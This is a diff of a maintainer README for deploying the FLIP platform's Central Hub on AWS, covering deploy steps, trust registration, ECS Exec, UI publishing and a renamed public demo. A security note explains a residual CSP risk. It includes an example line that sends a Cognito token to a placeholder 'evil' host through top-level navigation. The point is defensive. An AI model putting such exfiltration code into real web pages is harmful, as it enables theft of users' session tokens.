@@ -28,7 +28,7 @@ its kit and its registration:
 | **Hybrid / On-Premises** | Any Ubuntu host (home lab, hospital server, etc.) | [`trust/deploy/ansible/`](../../../trust/deploy/ansible/README.md) + selected targets in this Makefile |
 | **Kubernetes** | Any Kubernetes cluster 1.28+ (EKS, AKS, on-prem) | [`trust/deploy/helm/`](../../../trust/deploy/helm/README.md) Helm chart — deploy guide: [Deploy a trust on Kubernetes](https://londonaicentreflip.readthedocs.io/en/latest/deploy-flip/deploy-flip-node-kubernetes.html) |
 
-In both models, trusts poll the Central Hub for tasks over HTTPS — all communication is **outbound from the trust** to the hub. The hub never makes inbound requests to trusts.
+In every model, trusts poll the Central Hub for tasks over HTTPS. All communication is **outbound from the trust** to the hub; the hub never makes inbound requests to trusts.
 
 > [!NOTE]
 > **This README is the maintainer's notes**: how the stack is built, the Terraform CI internals, the test suites
@@ -71,15 +71,14 @@ This command executes the following steps in order:
 1. **`github-login`**: Authenticate with GitHub CLI
 2. **`aws-login`**: Authenticate with AWS SSO
 3. **`init`**: Initialize Terraform with environment-specific S3 backend
-4. **`generate-internal-service-key`**: Check the fl-server → hub `INTERNAL_SERVICE_KEY` and its hash are in sync (re-syncing a stale hash). It cannot mint a first key from this directory — the Makefile refuses to parse at all while `INTERNAL_SERVICE_KEY` is unset in the env file — so mint it beforehand from the repo root: `make generate-internal-service-key ENV_FILE=$(pwd)/.env.<hub>`
-5. **`plan`**: Generate and review the initial Terraform execution plan
-6. **`apply`**: Apply infrastructure changes
-7. **`update-env`**: Refresh the root environment file with Terraform outputs
-8. **`ssh-config`**: Update `~/.ssh/config` with SSM-managed EC2 instance IDs
-9. **`ansible-init`**: Patch the Central Hub bastion and install `psql` on it
-10. **`deploy-centralhub`**: Deploy the Central Hub ECS Fargate services (`flip-api`, `fl-api-net-1`, `fl-server-net-1`) at the tip of the env's branch via new task-definition revisions (see [Central Hub deploys and rollback](#central-hub-deploys-and-rollback-immutable-sha-tags)) and sync the UI to S3
-11. **`register-trusts`**: Register every locally-present trust kit file (none yet is fine) (`trust/.env.<CODE>.<hub>`) on the running hub and write its credentials back. Only the two hub-shared values the ECS task env carries (`TRUST_API_KEY_HEADER`, `FL_BACKEND`) come back with it — the rest of the block needs `make sync-trust-kit KIT=<CODE> HUB=<hub>` from the repo root afterwards (see [Registering trusts against the ECS hub](#registering-trusts-against-the-ecs-hub))
-12. **`status`**: Run comprehensive health checks
+4. **`plan`**: Generate and review the initial Terraform execution plan
+5. **`apply`**: Apply infrastructure changes
+6. **`update-env`**: Refresh the root environment file with Terraform outputs
+7. **`ssh-config`**: Update `~/.ssh/config` with SSM-managed EC2 instance IDs
+8. **`ansible-init`**: Patch the Central Hub bastion and install `psql` on it
+9. **`deploy-centralhub`**: Deploy the Central Hub ECS Fargate services (`flip-api`, `fl-api-net-1`, `fl-server-net-1`) at the tip of the env's branch via new task-definition revisions (see [Central Hub deploys and rollback](#central-hub-deploys-and-rollback-immutable-sha-tags)) and sync the UI to S3
+10. **`register-trusts`**: Register every locally-present trust kit file (none yet is fine) (`trust/.env.<CODE>.<hub>`) on the running hub and write its credentials back, with the hub-shared block from the local `.env.<hub>` (see [Registering trusts against the ECS hub](#registering-trusts-against-the-ecs-hub))
+11. **`status`**: Run comprehensive health checks
 
 To provision only the minimal Central Hub bastion after a targeted Terraform
 change, run `make provision-bastion HUB=stag|prod`.
@@ -107,7 +106,7 @@ two-trust port allocation).
 
 ### Registering trusts against the ECS hub
 
-The procedure, the kit-file suffixes, the mandatory `make sync-trust-kit` follow-up and what a failure looks like:
+The procedure, the kit-file suffixes and what a failure looks like:
 [Deploy the Central Hub → Registering trusts](https://londonaicentreflip.readthedocs.io/en/latest/deploy-flip/deploy-central-hub.html#deploy-central-hub-register-trusts).
 This section is how it works.
 
@@ -131,7 +130,9 @@ A waiter timeout warns and proceeds. Then, per kit, it:
    path and `sync-trust-kit` use: credentials on first registration only, operator host-local edits preserved, and
    the hub-shared block upserted with whatever the task's environment carried — on ECS only `TRUST_API_KEY_HEADER`
    and `FL_BACKEND` (`AES_KEY_BASE64` is a Secrets Manager value, never in the task env, and the other hub-shared
-   keys are not in the task definition at all). That gap is why the manual's `sync-trust-kit` step is mandatory.
+   keys are not in the task definition at all). So it then runs `trust/deploy/scripts/sync_trust_kit.py` on the kit,
+   as `make sync-trust-kit` does, filling the whole block from the operator env file the Makefile loaded; a key
+   missing there fails the run, naming it (FLIP#1476).
    It then mints the trust's XNAT stack passwords into the kit (`generate-xnat-credentials`), runtime-only
    trust-side secrets the hub never holds. That step runs locally through flip-api, so it needs flip-api's `uv`
    environment on the admin's machine.
@@ -141,7 +142,7 @@ there is nothing to re-emit); it never re-issues credentials. Delivery to a host
 EC2 node's own `make deploy` drives its Docker daemon over an SSH context, so the kit values reach the host only as
 container environment. For an on-prem operator, `make package-onprem-trust-kit
 KIT=<CODE>` tarballs `trust/.env.<CODE>.<hub>` (or the kit named by `KIT_FILE=<path>`) with the FL-kit slice of its
-`FL_KIT_SLOT`, once `sync-trust-kit` has filled it.
+`FL_KIT_SLOT`.
 
 #### Troubleshooting
 
@@ -150,12 +151,13 @@ KIT=<CODE>` tarballs `trust/.env.<CODE>.<hub>` (or the kit named by `KIT_FILE=<p
   salvages the `ERROR`/`WARNING` lines from the task's log stream before deleting it, falling back to the log tail
   for an unhandled traceback.
 - **Interactive debugging inside the running service** is still possible with ECS Exec, which is off by default
-  (`var.ecs_exec_enabled`):
+  (`var.ecs_exec_enabled`). It needs a writable root filesystem (the SSM agent it starts in the container writes
+  there), so the variable also lifts the services' read-only one (FLIP#1795). Switching exec on with
+  `aws ecs update-service --enable-execute-command` alone leaves the root read-only and the session fails with
+  `TargetNotConnectedException`. Apply with `TF_VAR_ecs_exec_enabled=true` (the commented line in the Makefile), then:
 
   ```bash
   export AWS_PROFILE=<env> AWS_REGION=eu-west-2
-  aws ecs update-service --cluster flip-cluster --service flip-api \
-    --enable-execute-command --force-new-deployment
   aws ecs wait services-stable --cluster flip-cluster --services flip-api
   TASK=$(aws ecs list-tasks --cluster flip-cluster --service-name flip-api \
     --query 'taskArns[0]' --output text)
@@ -163,8 +165,9 @@ KIT=<CODE>` tarballs `trust/.env.<CODE>.<hub>` (or the kit named by `KIT_FILE=<p
     --container flip-api --interactive --command /bin/bash
   ```
 
-  Prefer `make register-trusts` for the real thing: an interactive session leaves the kit payload in the session
-  output rather than in an encrypted SSM parameter.
+  Security Hub's ECS.5 fails for these task definitions while the variable is on, so apply again without it when
+  the session is over. Prefer `make register-trusts` for the real thing: an interactive session leaves the kit
+  payload in the session output rather than in an encrypted SSM parameter.
 
 ### flip-ui on S3 + CloudFront
 
@@ -173,187 +176,59 @@ The UI is served from S3 by the networking account's edge CloudFront at the cano
 **The UI ships with the apply (FLIP#1186).** Once `terraform_apply.yml` has applied a push to `develop` or `main`, its `ui` job runs [`publish_ui.yml`](../../../.github/workflows/publish_ui.yml), which publishes flip-ui from the same commit to that environment's bucket. A held or failed apply publishes nothing, so the UI never reaches users ahead of the API it calls; the `fl_quiesced: true` re-dispatch that releases a held apply publishes it. The workflow has two jobs:
 
 - **`build`** runs `npm ci && npm run build:deploy` with no AWS credentials and no secrets, because `npm ci` runs third-party install scripts. `window.js` is generated from the environment's variables `AWS_COGNITO_USER_POOL_ID`, `AWS_COGNITO_APP_CLIENT_ID`, `CENTRAL_HUB_API_URL`, `AWS_REGION` and `BLACKLISTED_MODEL_FILES`. These values are public: every browser receives them. `RELEASE_VERSION` is the release tag, or `sha-<short7>`. The apply job warns when the two Cognito variables no longer match `terraform output`.
-- **`publish`** assumes `TF_UI_PUBLISH_ROLE_ARN` and runs `scripts/publish-ui.sh` against `FLIP_UI_BUCKET_NAME`. That role is the bootstrap module's `AICentre-FLIPUiPublishRole` (set `ui_bucket_name` on the module): it can list the bucket and write its objects, never `ark_demo/*`, and nothing else. Afterwards the job reads `js/window.js` back through the site to confirm the new build is being served. While `TF_UI_PUBLISH_ROLE_ARN` is unset the job only warns.
+- **`publish`** assumes `TF_UI_PUBLISH_ROLE_ARN` and runs `scripts/publish-ui.sh` against `FLIP_UI_BUCKET_NAME`. That role is the bootstrap module's `AICentre-FLIPUiPublishRole` (set `ui_bucket_name` on the module): it can list the bucket and write its objects, never `demo/*`, and nothing else. Afterwards the job reads `js/window.js` back through the site to confirm the new build is being served. While `TF_UI_PUBLISH_ROLE_ARN` is unset the job only warns.
 
-If the `ui` job fails, re-run it from the apply run once the cause is fixed, or publish from a laptop with `make deploy-ui HUB=stag|prod`, which is also the rollback: run it from the previous release's checkout. There is no invalidation, since the distribution is in another account: `index.html` is served `no-cache` and the hashed assets as immutable. Both paths run `scripts/publish-ui.sh`, which syncs `dist/` to the bucket **root** with `--delete` and always excludes the `ark_demo/*` prefix. The real build's `dist/` has no `ark_demo/` output, so without the exclude every routine UI deploy (including `deploy-centralhub`, which calls `deploy-ui` as its last step) would delete the demo SPA. Publishing the demo bundle itself is a separate target, described below.
+If the `ui` job fails, re-run it from the apply run once the cause is fixed, or publish from a laptop with `make deploy-ui HUB=stag|prod`, which is also the rollback: run it from the previous release's checkout. There is no invalidation, since the distribution is in another account: `index.html` is served `no-cache` and the hashed assets as immutable. Both paths run `scripts/publish-ui.sh`, which syncs `dist/` to the bucket **root** with `--delete` and always excludes the `demo/*` prefix. The real build's `dist/` has no `demo/` output, so without the exclude every routine UI deploy (including `deploy-centralhub`, which calls `deploy-ui` as its last step) would delete the demo. Publishing the demo bundle itself is a separate target, described below.
 
-### Ark+ demo SPA bundle (`/ark_demo/*`)
+`make deploy-ui` builds from your working tree, so it is also how to try a branch's UI on staging: run `make deploy-ui HUB=stag` from the branch checkout. `window.js` takes its values from `.env.stag`, where `make update-env` writes the two Cognito IDs. Three things limit it:
 
-`make deploy-ark-demo HUB=stag|prod` builds the demo bundle (`npm run build:demo`, which also
-regenerates `dist/js/window.js` via `generate-demo-window-js.sh`) and syncs it to the **same**
-`FLIP_UI_BUCKET_NAME` bucket, under the `ark_demo/` prefix.
-It mirrors `deploy-ui`'s cache-control discipline — immutable, far-future `Cache-Control` for the
-hashed `static/` chunks (the demo build's `assetsDir`, see the Vite `assetsDir` note below),
-`no-cache` for `index.html` and `js/window.js` — because the edge's `/ark_demo/*` behaviour
-uses the `CachingOptimized` policy, which **honours** origin cache-control headers: a hand-upload
-without them would serve a stale `index.html` referencing already-deleted hashed chunks after the
-next demo redeploy. This is a separate command from `deploy-ui` deliberately — the demo (a
-point-in-time snapshot — see "`/ark_demo/*` origin isolation" below) is republished far less often
-than the real app, typically only when the register is re-captured.
+- The next develop apply's `ui` job publishes develop's UI over it.
+- Staging is stopped between deploys (see *Staging is stopped between deploys* below). The UI still loads from the bucket, but every API call fails until you dispatch `Staging Lifecycle` with `start-stag`. Staging then stays up until the 03:30 UTC nightly stop; to stop it sooner, dispatch `hold-then-stop` with a `hold_minutes` that covers the test.
+- It runs against the API that develop deployed. A UI change that needs API changes not yet on develop needs the whole branch deployed.
+
+### Public demo (`/demo/`, FLIP#1746)
+
+The public demo is a second flip-ui build (`npm run build:demo`) that runs offline on captured,
+scrubbed fixtures. It is published to the **same** `FLIP_UI_BUCKET_NAME` bucket under the `demo/`
+prefix, and the old `/ark_demo/` path answers with a 301 to `/demo/`. It offers no downloads, so it
+has no bucket of its own.
 
 ```bash
 cd deploy/providers/AWS
-make deploy-ark-demo HUB=stag|prod
+make deploy-demo HUB=prod
 ```
 
-### Ark+ demo download assets (`/ark_demo/assets/*`)
+`deploy-demo` uses the same cache-control split as `scripts/publish-ui.sh`, and its `--delete` is
+scoped to `demo/`. It is a separate command from `deploy-ui` on purpose: the demo is republished only
+when its fixtures are re-captured. The build's own check (`demo-fixtures.mjs check --dist dist`)
+fails it if an unscrubbed fixture reaches `dist/`.
 
-The public Ark+ demo (flip-ui `npm run build:demo`) offers multi-hundred-MB result and model-file
-zips for download. These are served by the **same edge distribution** at `/ark_demo/assets/*`
-from a dedicated S3 bucket (prod: `flip-lza-demo-assets`) that is **not public**: CloudFront reads
-it via cross-account OAC exactly like the flip-ui bucket, all four public-access blocks are on, and
-the bucket policy grants `s3:GetObject` on the `ark_demo/assets/*` prefix to that distribution only. Serving
-through CloudFront (instead of the public-prefix S3 URL the demo used pre-rollout) puts the WAF
-rate-limit rule in the download path and moves anonymous egress from raw S3 rates to CloudFront's.
-
-Terraform creates the bucket through the usual `flip_s3_bucket` module as
-`module.flip_demo_assets_bucket` (`flip-lza-demo-assets` / `flip-lza-stag-demo-assets`) whenever
-`DEMO_ASSETS_BUCKET_NAME` is set; leave it unset where there is no demo (FLIP#1199, and see "Ark+ demo
-on LZA" below).
-
-Rollout / new-bundle staging:
+**The edge is in another repository.** The networking account's distribution
+([aicentre-lza-iac](https://github.com/londonaicentre/aicentre-lza-iac)) carries a `/demo/*` ordered
+behaviour with an enforcing response-headers policy (`connect-src 'none'`, `style-src 'self'`), and
+its viewer-request function rewrites `/demo/` deep links to `/demo/index.html` and redirects
+`/ark_demo/<rest>` to `/demo/<rest>`. Without that behaviour the demo would be served by the default
+one, with the real app's report-only CSP. `deploy-demo` cannot see the edge, so it refuses to publish
+unless the hub env file sets `PUBLIC_DEMO=true`. Set it only once the edge change is applied (prod
+only; stag hosts no demo), and check after every publish:
 
 ```bash
-# Stage bundles under the prefix the CloudFront behaviour maps to
-aws s3 cp s3://flip-lza-demo-assets/ark_demo/<bundle>.zip \
-          s3://flip-lza-demo-assets/ark_demo/assets/<bundle>.zip --profile prod  # server-side copy
-
-# DEMO_ASSETS_BUCKET_NAME=flip-lza-demo-assets in .env.prod / the aws-prod
-# GitHub environment, then (LZA is CI-applied; the manual form is break-glass):
-cd deploy/providers/AWS
-make plan HUB=prod     # expect: +module.flip_demo_assets_bucket (bucket, versioning, PAB, policy)
-make apply HUB=prod
-
-# Verify: CloudFront serves, raw S3 is sealed
-curl -sI https://app.flip.aicentre.co.uk/ark_demo/assets/<bundle>.zip   # 200
-curl -sI https://flip-lza-demo-assets.s3.eu-west-2.amazonaws.com/ark_demo/<bundle>.zip  # 403
+curl -sI https://app.flip.aicentre.co.uk/demo/ | grep -i content-security-policy   # connect-src 'none'
+curl -sI https://app.flip.aicentre.co.uk/ark_demo/                                 # 301 to /demo/
 ```
 
-The demo UI's download URLs live in `flip-ui/src/demo/bootstrap.ts` (model-files zips) and
-`flip-ui/mocks/demo/data/*flres*.json` / `fl_results.json` (results zips); keep them **relative**
-(`/ark_demo/assets/…`), not absolute to `app.flip.aicentre.co.uk` — the demo SPA is always served
-same-origin under `/ark_demo/`, so a relative path resolves through CloudFront identically
-wherever the bundle is hosted (prod, stag, or a local preview), and it survives a domain change.
-An absolute form would silently point a stag-hosted or locally-previewed demo's downloads at prod.
+> **The CSP is defence in depth, not an origin boundary.** The demo shares an origin with the real,
+> authenticated app, so script running under `/demo/` can read a signed-in user's Cognito tokens in
+> `localStorage`. CSP has no directive for top-level navigation (`navigate-to` ships in no browser),
+> so `connect-src 'none'` does not stop `location.href = "https://evil/?t=" + token` (FLIP#794
+> review). The residual risk is accepted because the demo has no injection sink (no `v-html` or
+> `innerHTML` outside tests) and serves a static register compiled into the bundle. A separate
+> origin (e.g. `demo.flip.aicentre.co.uk`) is the only real separation; move to one if the demo
+> ever grows a dynamic content path.
 
-#### `/ark_demo/*` same-origin hosting (and its residual risk)
-
-The demo SPA itself (everything under `/ark_demo/` that isn't a downloadable bundle — the built
-`flip-ui` demo bundle, uploaded to the **same** `FLIP_UI_BUCKET_NAME` bucket under an `ark_demo/`
-prefix) shares an origin with the real, authenticated app. That means a real signed-in user's
-Cognito tokens in `localStorage` are reachable by any JS running under `app.flip.aicentre.co.uk` —
-including a hypothetical script-injection bug in the demo bundle. Rather than move the demo to a
-separate subdomain, it is served behind a dedicated, **enforcing** (not report-only)
-response-headers policy attached only to the edge distribution's `/ark_demo/*` behaviour.
-
-> **This CSP is defence in depth, not an origin boundary.** An earlier version of this section
-> claimed `connect-src 'none'` meant a leaked token had "nowhere on the network to go". That is not
-> correct and was fixed in review (FLIP#794): **CSP has no directive governing top-level
-> navigation** — `navigate-to` was dropped from CSP3 and ships in no browser, and `form-action`
-> covers form submission only — so `location.href = "https://evil/?t=" + token` is unaffected by
-> this policy. Same-origin hosting also grants the demo full read access to the real app's
-> `localStorage` and cookies regardless of any CSP; `connect-src` constrains where a page may
-> *connect*, not what it may *read*.
->
-> **The residual risk is real and accepted.** What keeps it closed today is that the demo has no
-> injection sink (no `v-html`/`innerHTML` outside a test file) and serves a static register compiled
-> into the bundle rather than attacker-supplied input — not the CSP. **A separate origin (e.g.
-> `demo.flip.aicentre.co.uk`) is the only control that genuinely separates the two token stores.**
-> Treat moving to one as the fix if the demo ever grows a dynamic content path.
-
-What the policy *does* buy is worth keeping: it blocks the entire fetch/XHR/WebSocket exfiltration
-class and every third-party resource load, and it enforces the "zero egress" property the demo
-design rests on. The demo's Mirage mock server never touches the real browser network stack (it
-replaces `XMLHttpRequest`/`fetch` outright), so this costs no demo functionality — confirmed by the
-original PR's Chrome net-log audit and pinned by the `zero egress` cases in
-`flip-ui/mocks/__tests__/demo-server.spec.ts`.
-
-Note the demo enforces `style-src 'self'` while the real app still runs that policy report-only, and
-CodeMirror injects an inline `<style>` at runtime on the cohort-query page — worth an eyeball on
-that page before a public launch.
-
-Three ordered behaviours now exist for the demo, evaluated in this precedence order (CloudFront
-uses the first `path_pattern` match, so order matters):
-1. `/api/*` → the relay to the internal NLB (existing, real-app API)
-2. `/ark_demo/assets/*` → the demo-assets bucket (`flip-lza-demo-assets`) (download bundles, no CSP —
-   direct file downloads, not HTML)
-3. `/ark_demo/*` → `flip-ui` bucket, same origin as the real app but with the strict demo CSP above
-
-The edge's `spa_rewrite` CloudFront Function (attached to both the default behaviour and
-`/ark_demo/*`) is prefix-aware: a deep link under `/ark_demo/` falls back to `/ark_demo/index.html`,
-never the real app's `/index.html` — the earlier version would have silently served the real
-(Cognito-gated) app for a demo URL.
-
-If the demo policy ever gets detached from the `/ark_demo/*` behaviour (drift, a future refactor),
-that hardening vanishes with **no functional symptom**, since the demo works identically without it.
-`make deploy-ark-demo` refuses to publish when `DEMO_ASSETS_BUCKET_NAME` is unset, but it cannot see
-the edge distribution, which is in another account — so verify after a (re)deploy, alongside the
-200/403 pair above:
-
-```bash
-curl -sI https://app.flip.aicentre.co.uk/ark_demo/ | grep -i content-security-policy   # expect: connect-src 'none' present
-```
-
-#### Ark+ demo on LZA (FLIP#1199)
-
-The demo moved to LZA prod with the rest of the hub: `aws-prod` was repointed at LZA prod on
-2026-10-06 and the legacy prod account was closed the same day. What this repository can do there, it
-does; what it cannot, it names.
-
-**In this repository's scope — the bucket.** `module.flip_demo_assets_bucket` (services.tf) creates
-`flip-lza-demo-assets` (stag: `flip-lza-stag-demo-assets`) when `DEMO_ASSETS_BUCKET_NAME` is set:
-versioned, server-access-logged to `ACCESS_LOGS_BUCKET_NAME`, all four
-public-access blocks on, `prevent_destroy`, and a bucket policy carrying DenyHTTP plus a
-`s3:GetObject` grant on the `ark_demo/assets/*` prefix to `TF_VAR_lza_web_edge_distribution_arn`. It
-is **SSE-S3 (AES256), not the app CMK** — the reader is a CloudFront service principal in another
-account, which cannot decrypt with this account's CMK (and never with the AWS-managed `aws/s3` key).
-`aws_s3_bucket.flip_ui`, the other bucket the edge reads, is AES256 for the same reason. The objects
-are public demo downloads; there is nothing confidential for a CMK to protect.
-
-Set in `.env.prod` (and the `aws-prod` GitHub environment, which is what CI composes from):
-
-```bash
-DEMO_ASSETS_BUCKET_NAME=flip-lza-demo-assets
-```
-
-Then stage bundles under the prefix the behaviour maps to:
-
-```bash
-aws s3 cp <bundle>.zip s3://flip-lza-demo-assets/ark_demo/assets/<bundle>.zip --profile prod
-```
-
-**NOT in this repository — the serving edge, which is a networking-account change.** There is no workload
-CloudFront distribution (the `GRCLOUDFRONTVPCORIGIN` SCP; see "Deploying onto an LZA estate"), and the
-public edge is the networking account's distribution from
-[aicentre-lza-iac](https://github.com/londonaicentre/aicentre-lza-iac). Three of the demo's four
-CloudFront-side pieces therefore have to be declared *there*:
-
-1. an **origin** for `flip-lza-demo-assets` with its own OAC (signing `always`, sigv4);
-2. an ordered behaviour `/ark_demo/assets/*` → that origin, `CachingOptimized`, listed **before**
-   `/ark_demo/*` (CloudFront takes the first matching `path_pattern`, so the broader SPA pattern
-   would otherwise swallow every download);
-3. an ordered behaviour `/ark_demo/*` → the flip-ui origin with the strict demo response-headers
-   policy (`connect-src 'none'`, `style-src 'self'`) and the prefix-aware `spa_rewrite` function, so
-   a deep link falls back to `/ark_demo/index.html` rather than the real app's `/index.html`.
-
-Until those land, `make deploy-ark-demo HUB=prod` publishes the SPA to the `ark_demo/` prefix of the
-UI bucket but the demo is served by the **default** behaviour — report-only CSP, and every
-`/ark_demo/assets/*` download 404s. Nothing in this repository can see that, so check before announcing
-the demo:
-
-```bash
-curl -sI https://<edge>/ark_demo/assets/<bundle>.zip                       # 200
-curl -sI https://flip-lza-demo-assets.s3.eu-west-2.amazonaws.com/ark_demo/assets/<bundle>.zip  # 403
-curl -sI https://<edge>/ark_demo/ | grep -i content-security-policy        # connect-src 'none'
-```
-
-**Vite `assetsDir` collision (already fixed, worth knowing about):** Vite's default `assetsDir`
-(`"assets"`) would put the demo bundle's own JS/CSS/font chunks at `/ark_demo/assets/*.js`, which
-collides with behaviour 2 above — that behaviour would intercept the bundle's own asset requests
-and serve them (wrongly, 403) from the downloads bucket instead of the `flip-ui` bucket, breaking
-the app before Vue mounts. `flip-ui/vite.config.mts` sets `assetsDir: "static"` for `--mode demo`
-specifically to avoid this; the real build is unaffected (still `dist/assets`). If the demo build
-config ever changes, re-check that its own output prefix doesn't re-collide with `ark_demo/assets/`.
+What the policy does buy: it blocks every fetch, XHR and WebSocket exfiltration path and every
+third-party load. The demo's Mirage server replaces `XMLHttpRequest`/`fetch` outright, so this costs
+no functionality; the `zero egress` cases in `flip-ui/mocks/__tests__/demo-server.spec.ts` pin it.
 
 ### FLIP application S3 buckets
 
@@ -362,11 +237,11 @@ The Central Hub uses four S3 buckets, each with a distinct purpose, access patte
 | Bucket (per env) | Env-var (`.env.{stag,prod}`) | Consumer | Browser CORS | Holds |
 |---|---|---|---|---|
 | `flip{env}-model-files-uploads` | `FLIP_MODEL_FILES_UPLOADS_BUCKET_NAME` | researcher browser (presigned **POST** upload, presigned **GET** download), flip-api reads | `POST`, `GET` from `https://<flip_alb_subdomain>` | researcher-uploaded model artefacts in two prefixes: `uploaded/` (staging — where the browser POSTs) and `scanned/` (promoted by flip-api's malware scan, FLIP#52). Every consumer reads `scanned/` only, so an unscanned or rejected file can never be bundled to a trust. Noncurrent versions expire after 30 days (the scan deletes rejected uploads and moves promoted ones, so this bucket accumulates tombstones). |
-| `flip{env}-fl-results` | `FLIP_FL_RESULTS_BUCKET_NAME` | fl-server writes, researcher browser (presigned **GET**) | `GET` from `https://<flip_alb_subdomain>` | FL training output / aggregated weights — the whole bucket is dedicated to this tenant so no prefix is needed |
+| `flip{env}-fl-results` | `FLIP_FL_RESULTS_BUCKET_NAME` | flip-api (an FL job uploads its own results through presigned part URLs), researcher browser (presigned **GET**) | `GET` from `https://<flip_alb_subdomain>` | FL training output / aggregated weights — the whole bucket is dedicated to this tenant so no prefix is needed |
 | `flip{env}-app-bundles` | `FLIP_APP_BUNDLES_BUCKET_NAME` | flip-api (boto3 only) | **none** (server-only — no `aws_s3_bucket_cors_configuration` resource is emitted at all) | `app_destinations/<model_id>/` (per-bundle FL apps: base templates + user model files, assembled by flip-api). The base FL application templates themselves are baked into the flip-api image (FLIP#724), not stored here. |
-| `flip{env}-aicentre` | `AICENTRE_BUCKET_NAME` | AWS trust nodes (the EC2 root's kit staging), AI Centre operators | `PUT`, `GET` | FL participant kits |
+| `flip{env}-aicentre` | `AICENTRE_BUCKET_NAME` | AWS trust nodes (the EC2 root's kit staging), the EFS provisioning task, flip-api (read-only), AI Centre operators | **none** (no browser reads or writes it) | FL participant kits |
 
-All four share standard configs: public access blocked, SSE-KMS server-side encryption with bucket keys enabled, versioning enabled. The three FLIP application buckets are rendered by the shared **`modules/flip_s3_bucket`** module, which `main.tf` consumes for every deployed environment, so a CORS or bucket-policy change plans identically across them. (Development uses no AWS buckets: the dev stack's object store is a local RustFS container, FLIP#1291.) The same module also renders the Ark+ demo-assets bucket (`module.flip_demo_assets_bucket`, `services.tf`), the one exception to the SSE-KMS rule above: it uses SSE-S3 (`sse_algorithm = "AES256"`) and grants the edge distribution's CloudFront OAC read access to `ark_demo/assets/*` through `extra_bucket_policy_statements_json`.
+All four share standard configs: public access blocked, SSE-KMS server-side encryption with bucket keys enabled, versioning enabled. The three FLIP application buckets are rendered by the shared **`modules/flip_s3_bucket`** module, which `main.tf` consumes for every deployed environment, so a CORS or bucket-policy change plans identically across them. (Development uses no AWS buckets: the dev stack's object store is a local RustFS container, FLIP#1291.)
 
 **Base FL application templates ship in the image, not S3.** As of FLIP#724 the base FL application templates (the repo's `fl-apps/` tree) are baked into the `flip-api` image and read from a local directory (`FL_APP_BASE_DIR`, default `/app/fl-apps`); flip-api bundles applications by uploading a selection from those local templates, plus the user's model files, into `flip{env}-app-bundles/app_destinations/<model_id>/`. The selection is an allowlist (FLIP#1008): the backend's app folder(s) plus its single root file ship, and everything else in the template directory is excluded and listed at debug level — worth knowing before pointing `FL_APP_BASE_DIR` at an operator-provided tree, since an unrecognised file is dropped rather than shipped. There is no longer any CI that syncs templates to S3, so the `flip{env}-app-bundles` bucket is written **only** by flip-api at bundle time. Template hotfixes therefore ship by rebuilding and redeploying the `flip-api` image.
 
@@ -390,35 +265,28 @@ make aws-login
 # 3. Initialize Terraform (uses the configured S3 backend)
 make init
 
-# 4. Check the fl-server -> hub INTERNAL_SERVICE_KEY + hash are in sync (the key must already be
-#    set in the env file or the Makefile will not parse; mint it first from the repo root with
-#    `make generate-internal-service-key ENV_FILE=$(pwd)/.env.<hub>`)
-make generate-internal-service-key
-
-# 5. Plan changes
+# 4. Plan changes
 make plan
 
-# 6. Apply infrastructure
+# 5. Apply infrastructure
 make apply
 
-# 7. Refresh the root env file with Terraform outputs (DB_HOST, the two Cognito IDs)
+# 6. Refresh the root env file with Terraform outputs (the two Cognito IDs)
 make update-env
 
-# 8. Configure SSH access
+# 7. Configure SSH access
 make ssh-config
 
-# 9. Configure the SSM bastion with Ansible
+# 8. Configure the SSM bastion with Ansible
 make ansible-init
 
-# 10. Deploy the Central Hub
+# 9. Deploy the Central Hub
 make deploy-centralhub
 
-# 11. Register every locally-present trust kit file on the hub and write its credentials back
+# 10. Register every locally-present trust kit file on the hub and write its credentials back
 make register-trusts
-#     ...then fill the rest of each kit's hub-shared block from the local env file (repo root):
-#     make sync-trust-kit KIT=<CODE> HUB=<hub>
 
-# 12. Check status
+# 11. Check status
 make status
 ```
 
@@ -498,7 +366,8 @@ To change it:
 #      services.tf, module "cognito" → callback_urls
 # 2. Apply — TARGETED at the app client. Never run a full `make apply` on stag/prod for
 #    this: it also applies whatever else is pending in the plan, FL task-definition
-#    replacements included. Same reasoning as `apply-fl-kit-slots` above. The apply
+#    replacements included. Same reasoning as `apply-fl-kit-slots` ("Growing the FL
+#    kit-slot pool", below). The apply
 #    updates Cognito immediately …
 make init HUB=stag
 terraform plan -target=module.cognito.aws_cognito_user_pool_client.client -out=cognito.tfplan
@@ -546,7 +415,9 @@ It runs `scripts/add_fl_kits.sh`: discovers the deployment's nets from S3, activ
 the remaining shortfall restores + fingerprint-verifies each net's CA workspace
 (`fl-services/nvflare/provision/workspace-<env>/`) and mints the next `Trust_<n>` names on **every** net via
 `nvflare provision --add_client` (existing kits untouched — no CA rotation), uploads **only** the new kits
-additively (never `aws s3 sync --delete`) plus a refresh of each net's mirrored `state/cert.json`, and appends the
+additively (never `aws s3 sync --delete`) plus a refresh of each net's mirrored CA state (`cert.json` under
+`fl-flare-ca-state/`, a prefix no ECS task role can read; see the nvflare README for estates that still hold it
+among the kits), and appends the
 activated + minted names to `FL_KIT_SLOT_NAMES` in the env file. The make target then re-invokes make for
 `apply-fl-kit-slots` (so the sub-make re-reads the edited env file) — a targeted plan/apply of only the
 `/flip/fl_kit_slot_names` SSM parameter, plus the flip-api task-role policy that grants its read so the first
@@ -573,27 +444,17 @@ Which env file and AWS profile each `HUB` value selects, and what it is treated 
 [Deploy the Central Hub → Prerequisites](https://londonaicentreflip.readthedocs.io/en/latest/deploy-flip/deploy-central-hub.html#prerequisites).
 `deploy/env_mode.mk` derives all of it once; `tests/test_env_mode.py` pins the table.
 
-**Staging:**
-
-```bash
-make full-deploy HUB=stag
-```
-
-**Production:**
-
-```bash
-make full-deploy HUB=prod
-```
-
-`HUB` selects the root env file — `HUB=stag` → `.env.stag`, `HUB=prod` → `.env.prod` — and is required: without
-it the AWS provider Makefile refuses every target but the static lint ones (an unset `HUB` means development, which
-has no AWS estate).
+`HUB` is required and selects the root env file: `HUB=stag` → `.env.stag`, `HUB=prod` → `.env.prod`. Without it the AWS provider Makefile refuses every target except the static lint ones (an unset `HUB` means development, which has no AWS estate). The commands are those in [Full Stack Deployment](#full-stack-deployment). The full per-estate table is under [Deploying onto an LZA estate](#deploying-onto-an-lza-estate).
 
 The Makefile maps `HUB` onto `TF_VAR_environment` (`prod` or `stag`). Terraform branches on this variable to gate prod-only RDS hardening — see [RDS lifecycle](#rds-lifecycle-stag-vs-prod).
 
 #### Renaming from `PROD` (FLIP#1479)
 
-*Remove with the old-name fallback (next release).* `HUB` replaced `PROD=true|stag|lza|lza-stag`, and any `PROD`
+> [!NOTE]
+> One-off migration for checkouts set up before `HUB` existed. Delete this subsection together with the
